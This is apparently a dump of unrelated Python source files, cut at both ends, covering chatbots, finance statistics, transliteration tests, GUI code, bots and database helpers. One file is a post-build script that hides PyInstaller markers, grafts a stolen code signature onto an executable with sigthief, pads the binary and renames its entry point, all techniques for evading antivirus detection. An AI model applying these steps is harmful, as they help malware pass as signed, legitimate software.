memory.save_context({'input': message['human']}, {'output': message['AI']})\n\n    # Initialize Groq Langchain chat object and conversation\n    groq_chat = ChatGroq(\n        groq_api_key=groq_api_key,\n        model_name=model\n    )\n\n    conversation = ConversationChain(\n        llm=groq_chat,\n        memory=memory\n    )\n\n    # If the user has asked a question,\n    if user_question:\n        # The chatbot's answer is generated by sending the full prompt to the Groq API.\n        response = conversation(user_question)\n        message = {'human': user_question, 'AI': response['response']}\n        st.session_state.chat_history.append(message)\n        st.write(\"Chatbot:\", response['response'])\n\n\nif __name__ == \"__main__\":\n    main()\n",
    "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nCreated on Mon Mar 25 16:35:14 2024\n\n@author: Utilisateur\n\"\"\"\n\nimport yfinance as yf\nimport numpy as np\nfrom copulas.multivariate import GaussianMultivariate\nfrom copulas.bivariate import Clayton, Frank, Gumbel\nfrom copulas.univariate import UniformUnivariate\nfrom scipy.stats import pearsonr, spearmanr, kendalltau\nimport matplotlib.pyplot as plt\nfrom pycop import archimedean\n\nassets = {\n    \"S&P 500\": \"^GSPC\",\n    \"MSCI Emerging Markets\": \"EEM\",\n    \"Bloomberg Commodity Index\": \"CMOD.MI\",\n    \"USD/CNY\": \"CNY=X\",\n    \"German Bonds\": \"EXSB.DE\" \n}\n\ntime_periods = {\n    \"Pre-Financial Crisis Growth\": (\"2005-01-01\", \"2007-12-31\"),\n    \"Post-Financial Crisis Recovery\": (\"2009-01-01\", \"2011-12-31\"),\n    \"COVID-19 Pandemic Impact\": (\"2020-01-01\", \"2022-12-31\"),\n    \"Late-2017 Market Rally\": (\"2017-09-01\", \"2018-02-28\"),\n    \"Trade War Uncertainty\": (\"2018-01-01\", \"2020-12-31\"),\n    \"Renminbi Devaluation\": (\"2014-01-01\", \"2016-12-31\"),\n    \"Trade War Period\": (\"2018-03-01\", \"2019-12-31\"),\n    \"Normalisation of ECB Monetary Policy\": (\"2017-01-09\", \"2018-12-31\"),\n    \"Chinese Economic Boom\": (\"2005-01-01\", \"2007-01-01\")\n}\n\ndef empirical_log_likelihood(copula, data, n_samples=100):\n    samples = copula.sample(n_samples)\n    empirical_likelihoods = copula.pdf(samples)\n    return np.mean(np.log(empirical_likelihoods))\n\ndef transform_to_uniform(marginals):\n    # Assuming 'marginals' is a pandas Series\n    return marginals.rank(method='average') / (len(marginals) + 1)\n\ndef empirical_log_likelihood(copula, data, n_samples=100):\n    samples = copula.sample(n_samples)\n    empirical_likelihoods = copula.pdf(samples)\n    return np.mean(np.log(empirical_likelihoods))\n\ndef calculate_aic(log_likelihood, num_parameters):\n    return 2 * num_parameters - 2 * log_likelihood\n\ndef find_best_copula(asset1_returns, asset2_returns):\n    # Transform to uniform distributions\n    asset1_uniform = transform_to_uniform(asset1_returns)\n    asset2_uniform = transform_to_uniform(asset2_returns)\n    data = np.column_stack((asset1_uniform, asset2_uniform))\n\n    # List of copulas to evaluate\n    copulas = [\n        GaussianMultivariate(),\n        Clayton(),\n        Frank(),\n        Gumbel(),\n        UniformUnivariate()\n    ]\n\n    aic_scores = {}\n    best_copula = None\n    best_aic = np.inf\n\n    for copula in copulas:\n        try:\n            copula.fit(data)\n            log_likelihood = empirical_log_likelihood(copula, data)\n            # Assuming the 'parameters' can somehow give us the number of parameters for AIC calculation.\n            # This is a simplification; you'll need to adjust based on your actual copula objects.\n            num_parameters = 1  # Placeholder. Determine the correct number based on your copula type.\n            aic = calculate_aic(log_likelihood, num_parameters)\n            aic_scores[copula.__class__.__name__] = aic\n            \n            if aic < best_aic:\n                best_aic = aic\n                best_copula = copula\n                \n            print(f\"{copula.__class__.__name__}: Log-likelihood = {log_likelihood}, AIC = {aic}\")\n\n        except Exception as e:\n            print(f\"An error occurred while fitting the copula: {e}\")\n\n    print(f\"Best copula based on AIC: {best_copula} with AIC = {best_aic}\")\n    return best_copula, aic_scores\n\n\n\n\ndef calculate_dependency(asset1, asset2, time_period_name):\n    asset1_data = yf.download(assets[asset1], start=time_periods[time_period_name][0], end=time_periods[time_period_name][1])\n    asset2_data = yf.download(assets[asset2], start=time_periods[time_period_name][0], end=time_periods[time_period_name][1])\n\n    if asset1_data.empty or asset2_data.empty:\n        print(f\"Data for {asset1} or {asset2} is empty. Skipping...\")\n        return\n    \n    asset1_returns = asset1_data['Close'].pct_change().dropna()\n    asset2_returns = asset2_data['Close'].pct_change().dropna()\n\n    asset1_returns, asset2_returns = asset1_returns.align(asset2_returns, join='inner')\n\n    best_copula = find_best_copula(asset1_returns, asset2_returns)\n    print(f\"Best copula for {asset1} / {asset2} during {time_period_name}: {best_copula}\")\n\n    aligned_asset1, aligned_asset2 = asset1_returns.align(asset2_returns, join='inner')\n\n    #Dependency mesures\n    pearson_corr, pearson_pval = pearsonr(aligned_asset1, aligned_asset2)\n    spearman_corr, spearman_pval = spearmanr(aligned_asset1, aligned_asset2)\n    kendall_tau, kendall_pval = kendalltau(aligned_asset1, aligned_asset2)\n\n    # Print the results\n    print(f\"{asset1} / {asset2} during {time_period_name}\")\n    print(f\"Pearson Correlation Coefficient (r): {pearson_corr:.4f}, p-value: {pearson_pval:.4g}\")\n    print(f\"Spearman's Rank Correlation Coefficient (rho): {spearman_corr:.4f}, p-value: {spearman_pval:.4g}\")\n    print(f\"Kendall's Tau Correlation Coefficient (tau): {kendall_tau:.4f}, p-value: {kendall_pval:.4g}\")\n    print(\"\\n\")\n    \n\nfor pair, periods in {\n    (\"S&P 500\", \"MSCI Emerging Markets\"",
    "# -*- coding: utf-8 -*-\n\nfrom __future__ import unicode_literals\n\nimport unittest\nimport unicodedata\n\nimport epitran\n\n\nclass TestQuechua(unittest.TestCase):\n    def setUp(self):\n        self.epi = epitran.Epitran('est-Latn')\n\n    # RULE 1\n    def test_kabi(self): \n        tr = self.epi.transliterate('kabi')\n        self.assertEqual(tr, 'k\u0251pi')\n\n    def test_kapi(self): \n        tr = self.epi.transliterate('kapi')\n        self.assertEqual(tr, 'k\u0251p\u02d0i')\n\n    def test_kappi(self): \n        tr = self.epi.transliterate('kappi')\n        self.assertEqual(tr, 'k\u0251p\u02d0\u02d0i')\n\n    def test_sodin(self): \n        tr = self.epi.transliterate('sodin')\n        self.assertEqual(tr, 'sot\u02b2in')\n\n    def test_kota(self): \n        tr = self.epi.transliterate('kota')\n        self.assertEqual(tr, 'kot\u02d0\u0251')\n\n    def test_pered(self): \n        tr = self.epi.transliterate('pered')\n        self.assertEqual(tr, 'peret')\n\n    # RULE 2\n    def test_k\u00f5rbgi(self): \n        tr = self.epi.transliterate('k\u00f5rbgi')\n        self.assertEqual(tr, 'k\u00f8rbk\u02d0i')\n    \n\n    # RULE 3\n    def test_h\u00e4bi(self): \n        tr = self.epi.transliterate('h\u00e4bi')\n        self.assertEqual(tr, '\u00e6pi')\n\n    def test_homme(self): \n        tr = self.epi.transliterate('homme')\n        self.assertEqual(tr, 'om\u02d0e')\n\n\n    # RULE 4\n    def test_siia(self): \n        tr = self.epi.transliterate('siia')\n        self.assertEqual(tr, 'si\u02d0ja')\n\n    def test_maia(self): \n        tr = self.epi.transliterate('maia')\n        self.assertEqual(tr, 'mai\u02d0ja')\n\n    def test_m\u00fc\u00fca(self): \n        tr = self.epi.transliterate('m\u00fc\u00fca')\n        self.assertEqual(tr, 'myija')\n\n    def test_j\u00e4nes(self): \n        tr = self.epi.transliterate('j\u00e4nes')\n        self.assertEqual(tr, 'j\u00e6nes')\n    \n    # RULE 5\n    def test_vere(self): \n        tr = self.epi.transliterate('vere')\n        self.assertEqual(tr, 'vere')\n    \n    def test_veere(self): \n        tr = self.epi.transliterate('veere')\n        self.assertEqual(tr, 've\u02d0re')\n    \n    def test_lina(self): \n        tr = self.epi.transliterate('lina')\n        self.assertEqual(tr, 'lin\u0251')\n    \n    def test_linna(self): \n        tr = self.epi.transliterate('lina')\n        self.assertEqual(tr, 'lin\u02d0\u0251')\n\n\n    # RULE 7\n    def test_du\u0161i(self): \n        tr = self.epi.transliterate('du\u0161i')\n        self.assertEqual(tr, 'tu\u0283\u02d0i')\n    \n\n    def test_k\u00e4sn(self): \n        tr = self.epi.transliterate('k\u00e4sn')\n        self.assertEqual(tr, 'k\u00e6\u0283\u02d0n')\n\n    def test_\u0161ahti(self): \n        tr = self.epi.transliterate('\u0161ahti')\n        self.assertEqual(tr, '\u0283\u0251hti')\n\n    def test_bluffi(self): \n        tr = self.epi.transliterate('bluffi')\n        self.assertEqual(tr, 'pluf\u02d0\u02d0i')\n\n    def test_fakti(self): \n        tr = self.epi.transliterate('fakti')\n        self.assertEqual(tr, 'fak\u02d0ti')\n\n    # RULE 9\n    def test_pani(self): \n        tr = self.epi.transliterate('pani')\n        self.assertEqual(tr, 'pan\u02b2i')\n\n    def test_lasi(self): \n        tr = self.epi.transliterate('lasi')\n        self.assertEqual(tr, 'las\u02b2i')\n    \n    def test_palju(self): \n        tr = self.epi.transliterate('palju')\n        self.assertEqual(tr, 'pal\u02b2ju')\n\n    def test_paljas(self): \n        tr = self.epi.transliterate('paljas')\n        self.assertEqual(tr, 'pal\u02b2jas')\n\n    def test_padi(self): \n        tr = self.epi.transliterate('padi')\n        self.assertEqual(tr, 'pat\u02b2i')\n",
    "\"\"\" Main Streamlit site file \"\"\"\n\nfrom yaml.loader import SafeLoader\nimport yaml\n\nimport streamlit as st\nimport streamlit_authenticator as stauth\n\n# Uncomment below if you need cookies:\n# import extra_streamlit_components as stx\n\n# Config page\nPAGE_TITLE = \"\"\nPAGE_ICON = \"\"\nst.set_page_config(\n    PAGE_TITLE, PAGE_ICON, layout=\"wide\", initial_sidebar_state=\"collapsed\"\n)\n#\n\n# Checks for empty variables\nif not PAGE_TITLE:\n    raise ValueError(\n        \"Please set the PAGE_TITLE variable to the title of your app\")\n\nif not PAGE_ICON:\n    raise ValueError(\n        \"Please set the PAGE_ICON variable to the icon of your app\")\n#\n\nwith open('config.yaml', 'r', encoding=\"utf-8\") as file:\n    config = yaml.load(file, Loader=SafeLoader)\n\nauthenticator = stauth.Authenticate(\n    config['credentials'],\n    config['cookie']['name'],\n    config['cookie']['key'],\n    config['cookie']['expiry_days'],\n    config['preauthorized']\n)\n\nauthenticator.login()\n\nauth_state = st.session_state[\"authentication_status\"]\nif auth_state is False or auth_state is None:\n    st.error('Username/password is incorrect')\n    try:\n        email, username, name = authenticator.register_user(\n            preauthorization=False)\n        if email:\n            st.success('User registered successfully')\n            with open('config.yaml', 'w', encoding=\"utf-8\") as file:\n                yaml.dump(config, file, default_flow_style=False)\n    except Exception as e:\n        st.error(e)\nelse:\n    # LOGGED IN CONTENT\n    pass\n",
    "import numpy as np\n\nfrom napari_phasors._widget import (\n    ExampleQWidget,\n    ImageThreshold,\n    threshold_autogenerate_widget,\n    threshold_magic_widget,\n)\n\n\ndef test_threshold_autogenerate_widget():\n    # because our \"widget\" is a pure function, we can call it and\n    # test it independently of napari\n    im_data = np.random.random((100, 100))\n    thresholded = threshold_autogenerate_widget(im_data, 0.5)\n    assert thresholded.shape == im_data.shape\n    # etc.\n\n\n# make_napari_viewer is a pytest fixture that returns a napari viewer object\n# you don't need to import it, as long as napari is installed\n# in your testing environment\ndef test_threshold_magic_widget(make_napari_viewer):\n    viewer = make_napari_viewer()\n    layer = viewer.add_image(np.random.random((100, 100)))\n\n    # our widget will be a MagicFactory or FunctionGui instance\n    my_widget = threshold_magic_widget()\n\n    # if we \"call\" this object, it'll execute our function\n    thresholded = my_widget(viewer.layers[0], 0.5)\n    assert thresholded.shape == layer.data.shape\n    # etc.\n\n\ndef test_image_threshold_widget(make_napari_viewer):\n    viewer = make_napari_viewer()\n    layer = viewer.add_image(np.random.random((100, 100)))\n    my_widget = ImageThreshold(viewer)\n\n    # because we saved our widgets as attributes of the container\n    # we can set their values without having to \"interact\" with the viewer\n    my_widget._image_layer_combo.value = layer\n    my_widget._threshold_slider.value = 0.5\n\n    # this allows us to run our functions directly and ensure\n    # correct results\n    my_widget._threshold_im()\n    assert len(viewer.layers) == 2\n\n\n# capsys is a pytest fixture that captures stdout and stderr output streams\ndef test_example_q_widget(make_napari_viewer, capsys):\n    # make viewer and add an image layer using our fixture\n    viewer = make_napari_viewer()\n    viewer.add_image(np.random.random((100, 100)))\n\n    # create our widget, passing in the viewer\n    my_widget = ExampleQWidget(viewer)\n\n    # call our widget method\n    my_widget._on_click()\n\n    # read captured output and check that it's as we expected\n    captured = capsys.readouterr()\n    assert captured.out == \"napari has 1 layers\\n\"\n",
    "import cv2\nimport numpy as np\n\n# Function to calculate brightness of a frame\ndef calculate_brightness(frame):\n    # Convert frame to grayscale\n    gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)\n    # Calculate mean brightness\n    brightness = np.mean(gray)\n    return brightness\n\n# Function to find the brightest region\ndef find_brightest_region(frame):\n    # Divide the frame into three regions (left, middle, right)\n    height, width = frame.shape[:2]\n    third_width = width // 3\n\n    # Calculate brightness of each region\n    left_brightness = calculate_brightness(frame[:, :third_width])\n    middle_brightness = calculate_brightness(frame[:, third_width:2*third_width])\n    right_brightness = calculate_brightness(frame[:, 2*third_width:])\n\n    # Find the region with the least brightness\n    min_brightness = min(left_brightness, middle_brightness, right_brightness)\n\n    # Determine direction based on the brightest region\n    if min_brightness == left_brightness:\n        direction = \"LEFT\"\n    elif min_brightness == right_brightness:\n        direction = \"RIGHT\"\n    else:\n        direction = \"STRAIGHT\"\n\n    return direction\n\n# Open video capture\ncap = cv2.VideoCapture('/Users/aatmaj/sem-VI-mini-project/midas.mp4')\n\n# Define the codec and create a VideoWriter object\nfourcc = cv2.VideoWriter_fourcc(*'mp4v')\nout = cv2.VideoWriter('output.mp4', fourcc, 20.0, (int(cap.get(3)), int(cap.get(4))))\n\n\nwhile(cap.isOpened()):\n    ret, frame = cap.read()\n    if not ret:\n        break\n\n    # Find the brightest region\n    direction = find_brightest_region(frame)\n\n    # Display direction\n    cv2.putText(frame, direction, (50, 50), cv2.FONT_HERSHEY_SIMPLEX, 1, (0, 255, 0), 2)\n\n    # Show frame\n    cv2.imshow('Frame', frame)\n\n    # Write the frame to the output video\n    out.write(frame)\n    # Exit if 'q' is pressed\n    if cv2.waitKey(25) & 0xFF == ord('q'):\n        break\n    cv2.waitKey(0)\n\n# Release video capture and close all windows\ncap.release()\ncv2.destroyAllWindows()\n",
    "\"\"\"\n\u8f85\u52a9\u6a21\u5757\n\"\"\"\n\n\nimport tkintertools\n\n\nclass Tip:\n    \"\"\" \u63d0\u793a\u6846\u7c7b \"\"\"\n\n    def __init__(self,\n                 canvas: tkintertools.Canvas,\n                 text: str,\n                 button: tuple[str, str] | None = None,\n                 bg: str = ''):\n        # \u7236\u753b\u5e03\u63a7\u4ef6\n        self.canvas = canvas\n        # \u63d0\u793a\u6846\u6a21\u5f0f\n        self.button = button\n        # \u6467\u6bc1\u5224\u65ad\n        self._destroy = False\n        # \u5f53\u524d\u7a97\u53e3\u5927\u5c0f\n        width = canvas.winfo_width()\n        height = canvas.winfo_height()\n        # \u63d0\u793a\u6846\u6587\u672c\u663e\u793a\n        self.text = tkintertools.CanvasLabel(canvas,\n                                             width - canvas.rate_x * 240,\n                                             height + canvas.rate_y * 10,\n                                             canvas.rate_x * 230,\n                                             canvas.rate_y * 90,\n                                             5, text, font=(\n                                                 '\u6977\u4f53', int(15 * canvas.rate_x)),\n                                             color_text=(\n                                                 'grey', 'white', 'white'),\n                                             color_fill=(bg, bg, 'grey'),\n                                             color_outline=('grey', 'white', 'white'))\n        if button:\n            # \u6dfb\u52a0\u4e00\u4e2a\u9760\u5de6\u4e0b\u7684\u6309\u94ae\n            self.left = tkintertools.CanvasButton(canvas,\n                                                  width - canvas.rate_x * 230,\n                                                  height + canvas.rate_y * 60,\n                                                  canvas.rate_x * 100,\n                                                  canvas.rate_y * 30,\n                                                  5,\n                                                  button[0],\n                                                  color_text=(\n                                                      'grey', 'red', 'red'),\n                                                  color_fill=('', '', 'grey'),\n                                                  color_outline=('grey', 'red', 'red'))\n            # \u6dfb\u52a0\u4e00\u4e2a\u9760\u53f3\u4e0b\u7684\u6309\u94ae\n            self.right = tkintertools.CanvasButton(canvas,\n                                                   width - canvas.rate_x * 120,\n                                                   height + canvas.rate_y * 60,\n                                                   canvas.rate_x * 100,\n                                                   canvas.rate_y * 30,\n                                                   5,\n                                                   button[1],\n                                                   color_text=(\n                                                       'grey', 'cyan', 'cyan'),\n                                                   color_fill=(\n                                                       '', '', 'grey'),\n                                                   color_outline=('grey', 'cyan', 'cyan'))\n\n    def fly(self, existence: int, first: bool = True, dy: int = -110):\n        \"\"\" \u63d0\u793a\u6846\u6d6e\u52a8\u5f39\u51fa\u65b9\u6cd5 \"\"\"\n        if first:\n            # \u542f\u52a8\u81ea\u6bc1\u5012\u8ba1\u65f6\u51fd\u6570\n            self.self_destruction(existence * 1000)\n\n        tkintertools.move(\n            self.canvas, self.text, 0, dy * self.canvas.rate_y, 300, 'rebound', 60)\n        if self.button:\n            tkintertools.move(\n                self.canvas, self.left, 0, dy * self.canvas.rate_y, 300, 'rebound', 60)\n            tkintertools.move(\n                self.canvas, self.right, 0, dy * self.canvas.rate_y, 300, 'rebound', 60)\n\n    def self_destruction(self, existence: int):\n        \"\"\" \u81ea\u6bc1\u8bbe\u5b9a\u65b9\u6cd5 \"\"\"\n        # \u63d0\u793a\u6846\u6700\u540e1\u79d2\u5185\u6d6e\u52a8\u6536\u56de\n        self.canvas.after(existence - 1000, self.fly, existence, False, 110)\n        # \u63d0\u793a\u6846\u81ea\u6bc1\n        self.canvas.after(existence, self.destroy)\n\n    def destroy(self):\n        \"\"\" \u6467\u6bc1\u63a7\u4ef6\u65b9\u6cd5 \"\"\"\n        if not self._destroy:\n            self._destroy = True\n            self.text.destroy()\n            if self.button:\n                self.left.destroy()\n                self.right.destroy()\n\n\nclass GameCard:\n    \"\"\" \u6e38\u620f\u5361\u7c7b \"\"\"\n\n    def __init__(self,\n                 canvas: tkintertools.Canvas,\n                 title: str,\n                 color: str,\n                 text: str,\n                 x1: int,\n                 y1: int,\n                 x2: int,\n                 y2: int):\n        self.canvas = canvas\n        self.title = canvas.create_text((x1 + x2) / 2, y1 + 30,\n                                        text=title,\n                                        fill=color,\n                                        font=('\u534e\u6587\u65b0\u9b4f', 25),\n                                        tags='25')\n        self.text = tkintertools.CanvasLabel(canvas, x1, y1, x2 - x1, y2 - y1, 5, text,\n                                             color_text=(\n                                                 'grey', 'white', 'white'),\n                                             color_fill=('', '', ''),\n                                             color_outline=('grey', 'white', 'white'))\n       ",
    "# Generated by Selenium IDE\nimport pytest\nimport time\nimport json\nfrom selenium import webdriver\nfrom selenium.webdriver.common.by import By\nfrom selenium.webdriver.common.action_chains import ActionChains\nfrom selenium.webdriver.support import expected_conditions\nfrom selenium.webdriver.support.wait import WebDriverWait\nfrom selenium.webdriver.common.keys import Keys\nfrom selenium.webdriver.common.desired_capabilities import DesiredCapabilities\n\nclass TestLockedlogin():\n  def setup_method(self, method):\n    self.driver = webdriver.Chrome()\n    self.driver.maximize_window()\n    self.vars = {}\n  \n  def teardown_method(self, method):\n    self.driver.quit()\n  \n  def test_lockedlogin(self):\n    self.driver.get(\"https://www.saucedemo.com/\")\n    self.driver.find_element(By.ID, \"user-name\").click()\n    self.driver.find_element(By.ID, \"user-name\").send_keys(\"locked_out_user\")\n    self.driver.find_element(By.ID, \"password\").click()\n    self.driver.find_element(By.ID, \"password\").send_keys(\"secret_sauce\")\n    self.driver.find_element(By.CSS_SELECTOR, \"*[data-test=\\\"login-button\\\"]\").click()\n    assert self.driver.find_element(By.CSS_SELECTOR, \"*[data-test=\\\"error\\\"]\").text == \"Epic sadface: Sorry, this user has been locked out.\"\n  ",
    "from telegram import Update\nfrom telegram.ext import Updater, CommandHandler, CallbackContext\nimport requests\nimport json\nimport os\nimport subprocess\nimport time\nimport jdatetime\nimport datetime\nimport pytz\nimport pycountry\n\ndirname = os.path.dirname(__file__)\njson_conf = os.path.join(dirname, 'conf.json')\nurl = \"https://check-host.net\"\ncolor_flag = {\n    4: \"\ud83d\udfe2\",\n    3: \"\ud83d\udfe1\",\n    2: \"\ud83d\udfe0\",\n    1: \"\ud83d\udd34\",\n    0: \"\u26a0\ufe0f\"\n}\nstart_cmd_msg = \"Welcome to the Ping Bot! \ud83d\udc4b\\n\\nThis bot checks the status of your servers every hour and sends you the results.\"\nip_cmd_msg = \"\ud83e\ude84 Command: /ip\\n\\n\ud83d\udd27 Usage:\\n\\n\ud83d\udd38 Add IP: /ip add 127.0.0.1\\n\ud83d\udd38 Remove IP: /ip rm 127.0.0.1\\n\ud83d\udd38 List Servers IP: /ip list\"\ncc_cmd_msg = \"\ud83e\ude84 Command: /cc\\n\\n\ud83d\udd27 Usage:\\n\\n\ud83d\udd38 Change Country: /cc ir\"\nnode_cmd_msg = \"\ud83e\ude84 Command: /node\\n\\n\ud83d\udd27 Usage:\\n\\n\ud83d\udd38 Change Node: /node ir\\n\\n\ud83d\udef0 Available Nodes:\\n\\nbr,bg,hr,cz,fi,fr,de,hk,in,ir,il,it,jp,kz,lt,md,nl,pl,pt,ru,rs,es,ch,tr,ae,uk,ua,us\"\nres_cmd_msg = \"\ud83e\ude84 Command: /res\\n\\n\ud83d\udd27 Usage:\\n\\n\ud83d\udd38 Restart Bot: /res\"\ncmd_msg = \"\ud83e\ude84 Bot Commands:\\n\\n\ud83d\udd38 Show this Message: /cmd\\n\ud83d\udd38 Add/Remove/List Servers IP: /ip\\n\ud83d\udd38 Ping Servers IP: /ping\\n\ud83d\udd38 Change Country: /cc\\n\ud83d\udd38 Change Node: /node\\n\ud83d\udd38 Restart Bot: /res\"\n\ndef handle_json(job, key, value):\n    with open(json_conf, 'r') as file:\n        data = json.load(file)\n    if job == \"get\":\n        return data[key]\n    else:\n        if job == \"add\":\n            data[\"servers\"].append(value)\n        elif job == \"rm\":\n            data[\"servers\"].remove(value)\n        elif job == \"rep\":\n            data[key] = value\n        with open(json_conf, 'w') as file:\n            json.dump(data, file, indent=4)\n\ndef json_data():\n    user_id = int(handle_json(\"get\", \"user_id\", \"\"))\n    token = handle_json(\"get\", \"bot_token\", \"\")\n    servers = handle_json(\"get\", \"servers\", \"\")\n    ccode = handle_json(\"get\", \"ccode\", \"\")\n    cnode = handle_json(\"get\", \"node\", \"\")\n    data_dict = {\"user_id\": user_id,\n                 \"token\": token,\n                 \"servers\": servers,\n                 \"ccode\": ccode,\n                 \"cnode\": cnode\n                 }\n    return data_dict\n\ndef time_calc(ccode):\n    try:\n        country_timezones = pytz.country_timezones(ccode.upper())\n    except:\n        country_timezones = None\n    if country_timezones and ccode == \"ir\":\n        tz = pytz.timezone(country_timezones[0])\n        now = jdatetime.datetime.now(tz=tz)\n    elif country_timezones:\n        tz = pytz.timezone(country_timezones[0])\n        now = datetime.datetime.now(tz=tz)\n    else:\n        tz = pytz.timezone('UTC')\n        now = datetime.datetime.now(tz=tz)\n    time_seconds = int(now.timestamp())\n    date_str = now.strftime(f'{tz}: %Y/%m/%d %H:%M:%S')\n    return int(time_seconds), date_str\n\ndef authenticate_user(func):\n    def for_function(update: Update, context: CallbackContext):\n        user = update.effective_chat.id\n        if json_data()[\"user_id\"] == user:\n            return func(update, context)\n        else:\n            pass\n    return for_function\n\ndef get_nodes(code):\n    code = code.lower()\n    try:\n        response = requests.get(f\"{url}/nodes/hosts\")\n    except:\n        time.sleep(20)\n        get_nodes(code)\n    data = json.loads(response.text)\n    country_nodes = []\n    location = []\n    for node, info in data[\"nodes\"].items():\n        if node.startswith(code):\n            location = info[\"location\"]\n            city = location[2]\n            country_nodes.append({\"name\": city, \"node\": node})\n    if len(location) > 1 and location[1] != \"\":\n        country = location[1]\n    else:\n        country = False\n        country_nodes = False\n    return country, country_nodes\n\ndef check_host(context: CallbackContext):\n    user_id = json_data()[\"user_id\"]\n    servers = json_data()[\"servers\"]\n    ccode = json_data()[\"ccode\"]\n    cnode = json_data()[\"cnode\"]\n    selected_node = get_nodes(cnode)\n    if (selected_node[0] is not False and selected_node[1] is not False) and (selected_node[0] is not [] and selected_node[1] is not []):\n        country = selected_node[0]\n        nodes = selected_node[1]\n        time_date = time_calc(ccode)[1]\n        context.bot.send_message(chat_id=user_id, text=f\"\ud83d\udef0 Pinging Started:\\n\\n\ud83d\uddd3 {time_date}\")\n        for server in servers:\n            ping_link = f\"{url}/check-ping?host={server}\"\n            for node in nodes:\n                ping_link += f'&node={node[\"node\"]}'\n            ping_response = requests.get(ping_link, headers={\"Accept\": \"application/json\"})\n            time.sleep(20)\n            ping_data = json.loads(ping_response.text)\n            result_link = f\"{url}/check-result/{ping_data['request_id']}\"\n            result_response = requests.get(result_link, headers={\"Accept\": \"application/json\"})\n            if result_response.status_code == 200:\n                try:\n                    stat = []\n                    result_data = result_response.json()\n                    node_index = 0\n                    for pings in result_data.values():\n                        successful_pings = 0\n           ",
    "async def update_footage(\n    db,\n    timestamp,\n    footage_id,\n    class_name,\n    text_data=\"\",\n):\n    video_data_result = await db.videodata.find_many(\n        where={\n            \"timestamp\": timestamp,\n            \"text_data\": text_data,\n            \"footage_id\": footage_id,\n        }\n    )\n\n    if len(video_data_result) == 0:\n        await db.videodata.create(\n            {\n                \"timestamp\": timestamp,\n                \"text_data\": text_data,\n                \"class_name\": class_name,\n                \"footage\": {\"connect\": {\"id\": footage_id}},\n            }\n        )\n\n\nasync def search_by_class(db, class_name, footage_id):\n    return await db.videodata.find_many(\n        where={\n            \"class_name\": {\"equals\": class_name, \"mode\": \"insensitive\"},\n            \"footage_id\": footage_id,\n        }\n    )\n\n\nasync def search_by_text_data(db, text_data, footage_id):\n    return await db.videodata.find_many(\n        where={\n            \"text_data\": {\"equals\": text_data, \"mode\": \"insensitive\"},\n            \"footage_id\": footage_id,\n        }\n    )\n",
    "import os\nfrom sigthief import signfile\nfrom PyInstaller.archive.readers import CArchiveReader\n\ndef RemoveMetaData(path: str):\n    print(\"Removing MetaData\")\n    with open(path, \"rb\") as file:\n        data = file.read()\n    \n    # Remove pyInstaller strings\n    data = data.replace(b\"PyInstaller:\", b\"PyInstallem:\")\n    data = data.replace(b\"pyi-runtime-tmpdir\", b\"bye-runtime-tmpdir\")\n    data = data.replace(b\"pyi-windows-manifest-filename\", b\"bye-windows-manifest-filename\")\n\n    # # Remove linker information\n    # start_index = data.find(b\"$\") + 1\n    # end_index = data.find(b\"PE\\x00\\x00\", start_index) - 1\n    # data = data[:start_index] + bytes([0] * (end_index - start_index))  + data[end_index:]\n\n    # # Remove compilation timestamp\n    # start_index = data.find(b\"PE\\x00\\x00\") + 8\n    # end_index = start_index + 4\n    # data = data[:start_index] + bytes([0] * (end_index - start_index))  + data[end_index:]\n    \n    with open(path, \"wb\") as file:\n        file.write(data)\n\ndef AddCertificate(path: str):\n    print(\"Adding Certificate\")\n    certFile = \"cert\"\n    if os.path.isfile(certFile):\n        signfile(path, certFile, path)\n\ndef PumpStub(path: str, pumpFile: str):\n    print(\"Pumping Stub\")\n    try:\n        pumpedSize = 0\n        if os.path.isfile(pumpFile):\n            with open(pumpFile, \"r\") as file:\n                pumpedSize = int(file.read())\n    \n        if pumpedSize > 0 and os.path.isfile(path):\n            reader = CArchiveReader(path)\n            offset = reader._start_offset\n\n            with open(path, \"r+b\") as file:\n                data = file.read()\n                if pumpedSize > len(data):\n                    pumpedSize -= len(data)\n                    file.seek(0)\n                    file.write(data[:offset] + b\"\\x00\" * pumpedSize + data[offset:])\n    except Exception:\n        pass\n\ndef RenameEntryPoint(path: str, entryPoint: str):\n    print(\"Renaming Entry Point\")\n    with open(path, \"rb\") as file:\n        data = file.read()\n\n    entryPoint = entryPoint.encode()\n    new_entryPoint = b'\\x00' + os.urandom(len(entryPoint) - 1)\n    data = data.replace(entryPoint, new_entryPoint)\n\n    with open(path, \"wb\") as file:\n        file.write(data)\n\nif __name__ == \"__main__\":\n    builtFile = os.path.join(\"dist\", \"Built.exe\")\n    if os.path.isfile(builtFile):\n        RemoveMetaData(builtFile)\n        AddCertificate(builtFile)\n        PumpStub(builtFile, \"pumpStub\")\n        RenameEntryPoint(builtFile, \"loader-o\")\n    else:\n        print(\"Not Found\")",
    "import math\nimport aka.nn as nn\nimport aka.numpy as np\n\ndef MetaLayer(**kwargs):\n    '''\n    Build resident meta layer by name. Include: GQA(Group-Query Attention), MLP, GateMLP, ...\n    '''\n    def __init__(self, name, **kwargs):\n        import importlib\n        module = importlib.import_module(name)\n        short_name = name.split('./\\\\')[-1]\n        m = getattr(module, short_name+\"Block\", None)\n        assert m is not None, f\"Unknown layer:{name}\"\n        self.norm = nn.RMSNorm(kwargs['latent_dim'])\n        self.layer = m(**kwargs)\n        self.x_gate = None if not kwargs.get('x_gate',False) else nn.Parameter(np.ones(kwargs['latent_dim']))\n        self.resident_gate = None if not kwargs.get('resident_gate',False) else nn.Parameter(np.ones(kwargs['latent_dim']))\n        return self\n\n    def forward(self, x, **kwargs):\n        y = self.norm(x)\n        if self.x_gate is not None:\n            x_gate = np.gelu(self.x_gate)\n            y = self.layer(y, **kwargs)\n            y = y * x_gate\n        else:\n            y = self.layer(y, **kwargs)\n        if self.resident_gate is not None:\n            x = x * np.gelu(self.resident_gate)\n        return x + y, None\n    return __init__(nn.Module(forward = forward), **kwargs)\n\ndef CausalLM(**kwargs):\n    '''\n    Causal Language Model.\n    '''\n    def __init__(self, **kwargs):\n        args = nn.Object(**kwargs)\n        self.tokenizer = args.tokenizer\n        self.latent_dim = args.latent_dim\n        self.vocab_dim = getattr(args, 'vocab_dim', args.latent_dim)\n        self.train_mode = getattr(args, 'train_mode', None)\n        self.in_proj = None if self.vocab_dim == self.latent_dim else nn.Linear(self.vocab_dim, self.latent_dim, bias=args.bias)\n        self.out_proj = None if 